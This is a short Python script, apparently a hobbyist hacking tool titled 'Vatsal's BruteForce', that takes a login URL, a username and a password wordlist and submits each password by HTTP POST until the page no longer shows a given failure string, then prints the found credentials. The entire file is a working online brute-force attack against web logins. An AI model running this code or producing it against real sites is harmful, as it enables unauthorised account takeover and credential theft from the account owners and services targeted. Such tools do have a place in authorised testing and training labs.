import pyfiglet
import requests
from termcolor import colored

ascii_banner = pyfiglet.figlet_format("Vatsal's BruteForce", font = 'slant')
print(ascii_banner)

print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To BruteForce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Falis: ')



def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()


with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')